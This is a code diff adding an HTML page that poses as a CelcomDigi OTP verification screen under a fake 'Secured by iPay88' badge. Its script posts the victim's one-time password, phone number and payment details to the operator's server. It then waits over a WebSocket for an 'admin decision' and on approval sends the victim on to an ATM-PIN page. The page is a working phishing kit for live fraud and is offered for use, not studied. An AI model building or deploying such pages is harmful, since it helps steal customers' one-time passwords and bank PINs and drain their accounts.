@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>OTP Verification - CelcomDigi</title>
+  <link rel="icon" href="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/637c596725cb8b7f82fe3680_favicon.png" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #003087;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 0;
+    }
+
+    /* Blue header */
+    .blue-header {
+      width: 100%;
+      background: linear-gradient(180deg, #001870 0%, #0a3fa8 60%, #1568e1 100%);
+      padding: 20px 20px 100px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+
+    .nav-bar {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+
+    .logo img { height: 30px; }
+
+    .timeout-badge {
+      background: #FFD700;
+      color: #111;
+      font-size: 13px;
+      font-weight: 700;
+      padding: 6px 18px;
+      border-radius: 20px;
+    }
+
+    /* White card overlapping blue */
+    .card-wrap {
+      width: 100%;
+      max-width: 480px;
+      padding: 0 16px;
+      margin-top: -80px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .white-card {
+      background: #fff;
+      border-radius: 20px 20px 0 0;
+      padding: 28px 24px 32px;
+      box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
+    }
+
+    .card-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 6px;
+    }
+
+    .card-sub {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+
+    .card-sub strong {
+      color: #111;
+    }
+
+    /* Error message */
+    .error-msg {
+      background: #fff3f3;
+      border: 1.5px solid #e53935;
+      color: #c62828;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      text-align: center;
+      display: none;
+    }
+    .error-msg.show { display: block; }
+
+    /* OTP inputs */
+    .otp-label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+
+    .otp-box {
+      width: 52px;
+      height: 56px;
+      border: 1.5px solid #d0d5dd;
+      border-radius: 10px;
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      color: #111;
+      background: #f9fafb;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .otp-box:focus {
+      border-color: #003087;
+      background: #fff;
+    }
+
+    /* Processing overlay */
+    .processing-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,48,135,0.85);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .processing-overlay.show { display: flex; }
+
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .processing-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    /* Submit button */
+    .btn-submit {
+      width: 100%;
+      height: 52px;
+      background: #003087;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      margin-bottom: 12px;
+    }
+    .btn-submit:hover { opacity: 0.9; }
+    .btn-submit.disabled {
+      background: #b3c3e0;
+      cursor: not-allowed;
+    }
+
+    .resend-wrap {
+      text-align: center;
+      font-size: 13px;
+      color: #666;
+    }
+    .resend-wrap a {
+      color: #003087;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .secure-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 20px;
+    }
+    .secure-badge svg {
+      width: 14px;
+      height: 14px;
+      fill: #aaa;
+    }
+
+    /* Bottom white continuation */
+    .bottom-white {
+      width: 100%;
+      max-width: 480px;
+      padding: 0 16px 40px;
+      background: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Blue Header -->
+  <div class="blue-header">
+    <div class="nav-bar">
+      <div class="logo">
+        <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
+      </div>
+      <div class="timeout-badge" id="timeoutBadge">Timeout: 08:00</div>
+    </div>
+  </div>
+
+  <!-- White Card -->
+  <div class="card-wrap">
+    <div class="white-card">
+
+      <div class="card-title">OTP Verification</div>
+      <div class="card-sub">
+        Enter the One-Time Password (OTP) sent to your registered mobile number ending in <strong id="maskedNumber">****</strong>.
+      </div>
+
+      <!-- Error message -->
+      <div class="error-msg" id="errorMsg">
+        Please verify the OTP sent to your mobile and try again.
+      </div>
+
+      <div class="otp-label">Enter OTP</div>
+      <div class="otp-inputs" id="otpInputs">
+        <input type="tel" maxlength="1" class="otp-box" id="otp0" oninput="otpInput(this,0)" onkeydown="otpKeydown(this,0)" />
+        <input type="tel" maxlength="1" class="otp-box" id="otp1" oninput="otpInput(this,1)" onkeydown="otpKeydown(this,1)" />
+        <input type="tel" maxlength="1" class="otp-box" id="otp2" oninput="otpInput(this,2)" onkeydown="otpKeydown(this,2)" />
+        <input type="tel" maxlength="1" class="otp-box" id="otp3" oninput="otpInput(this,3)" onkeydown="otpKeydown(this,3)" />
+        <input type="tel" maxlength="1" class="otp-box" id="otp4" oninput="otpInput(this,4)" onkeydown="otpKeydown(this,4)" />
+        <input type="tel" maxlength="1" class="otp-box" id="otp5" oninput="otpInput(this,5)" onkeydown="otpKeydown(this,5)" />
+      </div>
+
+      <button type="button" class="btn-submit disabled" id="submitBtn" onclick="handleSubmit()">Verify OTP</button>
+
+      <div class="resend-wrap">
+        Didn't receive the OTP? <a onclick="resendOTP()">Resend OTP</a>
+      </div>
+
+      <div class="secure-badge">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        Secured by iPay88
+      </div>
+
+    </div>
+  </div>
+  <div class="bottom-white"></div>
+
+  <!-- Processing Overlay -->
+  <div class="processing-overlay" id="processingOverlay">
+    <div class="spinner"></div>
+    <div class="processing-text">Verifying OTP...</div>
+  </div>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const sessionId = params.get('sessionId');
+  const number = params.get('number') || '-';
+  const amount = params.get('amount') || '0';
+  const ref = params.get('ref') || '';
+  const type = params.get('type') || 'bill';
+  const errorParam = params.get('error');
+
+  // Show masked number
+  const masked = number.length > 4 ? '****' + number.slice(-4) : '****';
+  document.getElementById('maskedNumber').textContent = masked;
+
+  // Show error if rejected
+  if (errorParam === 'otp') {
+    document.getElementById('errorMsg').classList.add('show');
+  }
+
+  if (!sessionId) {
+    window.location.href = '/bill';
+  }
+
+  // Timeout countdown
+  let timeLeft = 8 * 60;
+  const timeoutBadge = document.getElementById('timeoutBadge');
+  const timeoutInterval = setInterval(() => {
+    timeLeft--;
+    const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+    const s = (timeLeft % 60).toString().padStart(2, '0');
+    timeoutBadge.textContent = `Timeout: ${m}:${s}`;
+    if (timeLeft <= 0) {
+      clearInterval(timeoutInterval);
+      window.location.href = type === 'reload' ? '/reload' : '/bill';
+    }
+  }, 1000);
+
+  // OTP input logic
+  function otpInput(el, idx) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value && idx < 5) {
+      document.getElementById('otp' + (idx + 1)).focus();
+    }
+    checkOTPComplete();
+  }
+
+  function otpKeydown(el, idx) {
+    if (event.key === 'Backspace' && !el.value && idx > 0) {
+      document.getElementById('otp' + (idx - 1)).focus();
+    }
+  }
+
+  function checkOTPComplete() {
+    let otp = '';
+    for (let i = 0; i < 6; i++) {
+      otp += document.getElementById('otp' + i).value;
+    }
+    document.getElementById('submitBtn').classList.toggle('disabled', otp.length < 6);
+  }
+
+  function getOTPValue() {
+    let otp = '';
+    for (let i = 0; i < 6; i++) {
+      otp += document.getElementById('otp' + i).value;
+    }
+    return otp;
+  }
+
+  function resendOTP() {
+    alert('A new OTP has been sent to your registered mobile number.');
+  }
+
+  // Submit OTP
+  async function handleSubmit() {
+    if (document.getElementById('submitBtn').classList.contains('disabled')) return;
+    const otp = getOTPValue();
+
+    // Show processing overlay
+    document.getElementById('processingOverlay').classList.add('show');
+
+    try {
+      const res = await fetch('/api/otp-submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId, otp, number, amount, ref, type })
+      });
+      const data = await res.json();
+      if (data.success) {
+        // Wait for admin decision via WebSocket
+        connectWS();
+      } else {
+        document.getElementById('processingOverlay').classList.remove('show');
+        alert('Error submitting OTP. Please try again.');
+      }
+    } catch (err) {
+      document.getElementById('processingOverlay').classList.remove('show');
+      alert('Network error. Please try again.');
+    }
+  }
+
+  function handleStatusUpdate(status) {
+    if (status === 'otp_approved') {
+      clearInterval(timeoutInterval);
+      window.location.href = '/atm-pin?sessionId=' + encodeURIComponent(sessionId)
+        + '&number=' + encodeURIComponent(number)
+        + '&amount=' + encodeURIComponent(amount)
+        + '&ref=' + encodeURIComponent(ref)
+        + '&type=' + type;
+    } else if (status === 'otp_rejected') {
+      clearInterval(timeoutInterval);
+      // Clear OTP inputs and show error
+      for (let i = 0; i < 6; i++) {
+        document.getElementById('otp' + i).value = '';
+      }
+      document.getElementById('processingOverlay').classList.remove('show');
+      document.getElementById('errorMsg').classList.add('show');
+      document.getElementById('submitBtn').classList.add('disabled');
+      document.getElementById('otp0').focus();
+    }
+  }
+
+  // WebSocket
+  const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+  const wsUrl = `${wsProtocol}//${window.location.host}?role=client&sessionId=${sessionId}`;
+  let ws;
+
+  function connectWS() {
+    ws = new WebSocket(wsUrl);
+    ws.onopen = () => console.log('[WS] OTP page connected');
+    ws.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      if (data.sessionId === sessionId) {
+        handleStatusUpdate(data.status);
+      }
+    };
+    ws.onclose = () => setTimeout(connectWS, 3000);
+  }
+
+  // Poll fallback
+  function pollStatus() {
+    fetch(`/api/card-status/${sessionId}`)
+      .then(r => r.json())
+      .then(data => {
+        if (data.success && (data.status === 'otp_approved' || data.status === 'otp_rejected')) {
+          handleStatusUpdate(data.status);
+        }
+      })
+      .catch(() => {});
+  }
+  setInterval(pollStatus, 5000);
+</script>
+</body>
+</html>
